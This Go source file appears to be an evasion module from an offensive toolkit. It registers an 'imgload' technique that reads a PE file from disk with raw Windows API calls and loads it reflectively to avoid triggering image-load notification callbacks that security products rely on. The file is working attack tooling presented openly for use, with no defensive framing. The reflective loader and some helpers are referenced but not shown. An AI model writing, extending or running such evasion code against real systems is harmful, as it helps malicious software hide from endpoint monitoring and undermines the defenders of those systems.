//go:build windows

package main

import (
	"fmt"
	"os"
	"syscall"
	"unsafe"
)

var (
	imgLoadK32            = syscall.NewLazyDLL("kernel32.dll")
	procImgCreateFileW    = imgLoadK32.NewProc("CreateFileW")
	procImgGetFileSize    = imgLoadK32.NewProc("GetFileSize")
	procImgReadFile       = imgLoadK32.NewProc("ReadFile")
	procImgSetFilePointer = imgLoadK32.NewProc("SetFilePointer")
)

func init() {
	registerEvasion("imgload", runEvasionImgLoad)
}

func runEvasionImgLoad() string {
	result := "[*] Image Load Callback Bypass: Manual PE Mapping\n"
	result += "[*] LoadLibrary bypasses PsSetLoadImageNotifyRoutine by mapping from disk\n"

	result += testManualMapping()

	return result
}

func testManualMapping() string {
	systemPath := os.Getenv("SystemRoot")
	if systemPath == "" {
		systemPath = "C:\\Windows"
	}
	dllPath := systemPath + "\\System32\\kernel32.dll"

	data, err := readFileFromDisk(dllPath)
	if err != nil {
		return fmt.Sprintf("[!] Manual mapping test: read failed (%v)\n", err)
	}

	if len(data) < 64 {
		return "[!] Manual mapping test: file too small\n"
	}

	baseAddr, err := loadDLLReflectively(data)
	if err != nil {
		return fmt.Sprintf("[!] Manual mapping test: reflective load failed (%v)\n", err)
	}

	return fmt.Sprintf("[+] Manual mapping test: %s loaded at 0x%X without triggering image load callbacks\n", dllPath, baseAddr)
}

func mapPEFromDisk(path string) (uintptr, []byte, error) {
	data, err := readFileFromDisk(path)
	if err != nil {
		return 0, nil, fmt.Errorf("read PE from disk: %w", err)
	}

	baseAddr, err := loadDLLReflectively(data)
	if err != nil {
		return 0, nil, fmt.Errorf("reflective load: %w", err)
	}

	return baseAddr, data, nil
}

func loadManualPE(path string) (string, error) {
	baseAddr, _, err := mapPEFromDisk(path)
	if err != nil {
		return "", fmt.Errorf("manual PE load: %w", err)
	}
	return fmt.Sprintf("PE loaded at 0x%X without triggering image load callbacks", baseAddr), nil
}

func readFileFromDisk(path string) ([]byte, error) {
	pathPtr, _ := syscall.UTF16PtrFromString(path)

	hFile, _, _ := procImgCreateFileW.Call(
		uintptr(unsafe.Pointer(pathPtr)),
		0x80000000,
		1,
		0,
		3,
		0x80,
		0,
	)
	if hFile == 0 || hFile == ^uintptr(0) {
		return nil, fmt.Errorf("CreateFileW failed: handle=%x", hFile)
	}
	defer procCloseHandle.Call(hFile)

	fileSize, _, _ := procImgGetFileSize.Call(hFile, 0)
	if fileSize == 0 || fileSize > 100*1024*1024 {
		return nil, fmt.Errorf("invalid file size: %d", fileSize)
	}

	buf := make([]byte, fileSize)
	var bytesRead uint32

	ret, _, _ := procImgReadFile.Call(
		hFile,
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(fileSize),
		uintptr(unsafe.Pointer(&bytesRead)),
		0,
	)
	if ret == 0 {
		return nil, fmt.Errorf("ReadFile failed")
	}

	return buf[:bytesRead], nil
}
